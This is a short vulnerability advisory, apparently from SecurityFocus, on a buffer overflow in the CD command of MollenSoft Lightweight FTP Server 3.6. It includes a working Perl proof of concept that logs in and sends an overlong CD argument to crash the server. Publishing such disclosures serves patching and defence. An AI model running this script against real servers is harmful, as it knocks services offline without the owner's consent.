source: http://www.securityfocus.com/bid/10429/info

Lightweight FTP Server is prone to a remote buffer overflow vulnerability. This vulnerability can potentially allow a remote attacker to execute arbitrary code in the context of the server process. This issue presents itself due to a lack of sufficient boundary checks performed on CD command arguments.

Lightweight FTP Server version 3.6 is prone to this issue.

This issue is likely related to the issue previously described in BID 10409 (MollenSoft Lightweight FTP Server Remote Denial Of Service Vulnerability). This BID will be updated or retired subsequent to further analysis.

# C:\Active Perl\perl
# POC for mollensoft ftp server 3.6
# Will crash the deamon

use IO::Socket::INET;

$host = "localhost";
$port = 21;
$buffer = "A" x 238;

$socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);

print $socket "USER root\r\n";
$socket->recv($test,100);
print $test;

print $socket "PASS password\r\n";
$socket->recv($test,100);
print $test;

print $socket "CD $buffer\r\n";
$socket->recv($test,100);
print $test;

close($socket);